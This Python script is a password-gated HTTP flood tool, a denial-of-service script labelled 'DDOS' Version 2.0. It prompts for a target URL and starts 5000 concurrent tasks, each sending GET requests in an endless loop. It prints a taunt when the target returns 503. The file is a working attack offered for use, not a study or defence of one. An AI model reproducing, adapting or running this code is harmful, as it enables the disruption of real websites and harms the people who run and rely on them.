import aiohttp
import asyncio
import os
import importlib

os.system('cls' if os.name == 'nt' else 'clear')

print("""
\033[31m▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                          
                            Version 2.0
\033[0m
\033[31mCreated by Joshua Apostol\n\033[0m
\033[31mPlease do not attack gov or edu website thankyou!!!\033[0m
""")

password_module = importlib.import_module('password')

total_requests = 1000000
requests_per_second = 5000  # Increase concurrency for faster attack

async def attack(target_url):
    try:
        async with aiohttp.ClientSession() as session:
            while True:  # Continuous loop
                async with session.get(target_url) as response:
                    if response.status == 503:
                        print("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣")
                    elif response.status == 200:
                        print("Website still up.")
                    else:
                        print(f"Unexpected status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Client error: {e}")
    except asyncio.TimeoutError:
        print("Request timed out")
    except Exception as e:
        print(f"Unexpected error: {e}")

async def main(target_url):
    await asyncio.gather(*[attack(target_url) for _ in range(requests_per_second)])

if __name__ == "__main__":
    input_password = input("Enter the password: ")
    if input_password == password_module.PASSWORD:
        target_url = input("Enter the URL to attack: ")
        asyncio.run(main(target_url))
    else:
        print("Incorrect password. Access denied.")
